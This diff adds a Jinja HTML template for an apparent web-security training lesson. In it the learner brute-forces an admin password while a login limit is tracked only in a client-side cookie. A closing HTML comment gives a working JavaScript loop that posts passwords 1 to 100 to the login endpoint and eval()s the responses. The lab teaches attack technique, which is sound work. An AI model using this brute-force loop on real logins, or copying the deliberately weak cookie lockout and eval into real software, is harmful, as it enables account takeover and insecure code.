@@ -1,0 +1,124 @@
+{% autoescape true %}
+
+        <title>Cookie Change</title>
+        <script type = "text/javascript" src = "http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>	
+        <!-- include jquery and your js -->
+        <script src="/js/cookie_change.js"></script>
+        <script src="/js/jquery.js" type="text/javascript"></script>
+        <link href="/css/cookie_change.css" rel="stylesheet" type="text/css"  >
+
+
+
+<!-- HTML fragment correpsonding to the lesson content -->
+{% if finished %}
+	<div style="color:red;"> <br>&nbsp;&nbsp;Congratulations!!! </div>
+{% endif %}
+	<div id="lessonContent">
+			{% if not finished %}
+				<br><br>
+			{% endif %}	
+			<br>		
+		    * Your victim is a system that takes an activation key to allow you to use it.<br>
+		    * You should find the right password of admin by brute force.<br>
+		    * If you have tryed more than 5 times the web will forbid you to try again,<br>
+		    &nbsp;think how the web know that.<br>
+		    * The password is a number between 1-100, try to guess it.
+	</div>
+	<div id="message" class="info"></div>
+
+	<div id="lessonContent">
+	    <br>
+	    <h1>Welcome to Login Page:</h1>
+	    <br>&nbsp;&nbsp;
+	    <br>&nbsp;&nbsp;
+	    <br><br><br>
+	    <div id="loginsection" align="center">
+		    	<table align="center" cellspacing="0" width="wrap_content"  cellpadding="5">
+					<tbody>
+						<tr>
+							<td align="left">&nbsp;Username:</td>
+							<td align="left"><input onclick="this.select()" style="text-align: right;" onkeyup="" id="username" type="TEXT" value="" /></td>
+						</tr>
+						<tr>
+							<td align="left">&nbsp;Password:</td>
+							<td align="left"><input onclick="this.select()" style="text-align: right;" onkeyup="" id="password" type="password" value="" /></td>
+						</tr>
+					</tbody>
+				</table>
+				<br>
+				<table>
+					<td>
+						<input id='LOGIN' value='LOGIN' type='BUTTON' onclick="submit();">
+						&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					</td>
+					<td><input id='CLEAR' value='CLEAR' type='BUTTON' onclick="clearit();"></td>
+				</table>
+	    </div>
+	    <div id="hiddensection" hidden>
+	    	Here is the admin username: admin
+		<div id='MessageDiv' name='MessageDiv'></div>
+	</div>
+
+	<div id="glassDiv">
+	  You log in successfully!
+	  <br>
+	  <br>
+	  <div style="text-align:right;">
+		<div id="okdiv">
+			<form accept-charset='UNKNOWN' method='POST' action='/cookie_change'>
+				<input type="submit" id="ccc" value="OK" onclick='$("#glassDiv").css("display", "none");'>
+			</form>
+		</div>
+	  </div>
+	</div>
+
+	<div id="glassDiv0">
+	  !Please enter valid value(s)!
+	  <br>
+	  <br>
+	  <div style="text-align:right;">
+		<div id="okdiv">
+		  <input type="button" id="ccc0" value="OK" onclick='$("#glassDiv0").css("display", "none");'>
+		</div>
+	  </div>
+	</div>
+
+{% endautoescape %}
+
+
+<!-- 
+Hint: The web have a cookie to record the times that you have tried to guess the password.
+		You should fix the cookie "trynum".
+		You can delete the "glassDiv0" to avoid its appearance.
+		You can write some js code to do a loop to automatically finish the process, until the glassDiv appears.
+		Or you can just guess by youself, good luck!
+
+		The js code can be like this:
+
+		var username='admin';
+		for (var i=1;i<=100;i++) {
+    		var url = 'cookie_change/login';
+    		postdata =  "from=ajax" + "&username=" + username
+                            + "&password=" + i;
+	    	if (typeof XMLHttpRequest != 'undefined') {
+	        	req = new XMLHttpRequest();
+	    	} else if (window.ActiveXObject) {
+	       	 req = new ActiveXObject('Microsoft.XMLHTTP');
+	    	}
+	    	req.open('POST', url, false);
+	    	req.onreadystatechange = callback;
+	    	req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+	    	req.send(postdata);
+
+		    function callback() {
+		        if (req.readyState == 4) {
+		            if (req.status == 200) {
+		                var message = req.responseText;
+		                console.log(message);
+		                eval(message);
+		            }
+		        }
+		    }
+		    console.log(i);
+	    }
+-->	
